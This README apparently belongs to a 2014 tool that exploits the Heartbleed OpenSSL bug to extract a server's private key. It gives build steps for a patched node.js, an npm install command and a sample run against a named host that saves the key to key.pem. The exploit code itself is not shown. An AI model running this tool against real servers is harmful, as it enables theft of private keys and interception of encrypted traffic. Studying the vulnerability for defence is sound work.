# Heartbleed

Extracting server private key using [Heartbleed][0] OpenSSL vulnerability.

## How to use

You will need patched node.js version in order to be able to run this script.
The instructions of compiling it are following:

```bash
git clone git://github.com/indutny/heartbleed
git clone git://github.com/joyent/node -b v0.10.26 node-hb
cd node-hb
git apply ../heartbleed/node-v0.10.26.patch
./configure --prefix=$HOME/.node/0.10.26-hb
make -j24
ls ./node
```

Then you could just install this script using npm:

```bash
export PATH="$HOME/.node/0.10.26-hb/bin:$PATH"
npm install -g heartbleed
```

And run it:

```bash
$ heartbleed
Options:
  --host         [required]
  --port         [default: 443]
  --concurrency  [default: 1]

Missing required arguments: host

$ heartbleed -h cloudflarechallenge.com -c 1000 > key.pem
```

#### LICENSE

This software is licensed under the MIT License.

Copyright Fedor Indutny, 2014.

Permission is hereby granted, free of charge, to any person obtaining a
copy of this software and associated documentation files (the
"Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to permit
persons to whom the Software is furnished to do so, subject to the
following conditions:

The above copyright notice and this permission notice shall be included
in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN
NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE
USE OR OTHER DEALINGS IN THE SOFTWARE.

[0]: http://heartbleed.com/
